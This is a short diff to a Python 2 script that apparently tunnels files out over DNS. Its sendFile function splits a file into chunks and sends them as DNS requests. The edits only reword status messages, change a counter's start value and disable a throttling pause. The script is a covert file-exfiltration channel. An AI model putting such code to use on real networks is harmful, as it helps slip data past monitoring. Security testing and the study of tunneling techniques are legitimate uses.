@@ -71,8 +71,8 @@ def sendFile(instr):
     
     # send start request
     print 'send start'
-    print 'dns tunneling is slow, make a cup of tea or three...'
-    count=0
+    print 'DNS tunneling is slow, make a cup of tea or three...'
+    count=1
     
     # add domain splitter 2e0o2e
     sendrequest('startoffile.'+filename+'.2e0o2e', count)
@@ -83,10 +83,10 @@ def sendFile(instr):
     while True: 
         chunk = file.read(chunksize) 
      #  time.sleep(0.01)
-
+        
         # increment sleepcount to give DNS a rest  to increase reliability of file transfer
         if sleepcount==20:
-            time.sleep(0.5)
+            #time.sleep(0.5)
             sleepcount=0
         else:
             sleepcount+=1
@@ -99,12 +99,13 @@ def sendFile(instr):
         count+=1
      
     # close sending request
-    print 'sending end'
+    print 'Wrapping up...'
     time.sleep(2)
 
     sendrequest('endoffile', count)
+    print 'File send complete.'
 
-    count=0
+    count=1
         
    # decoder(fullarray)
 ## for testing encoding function  
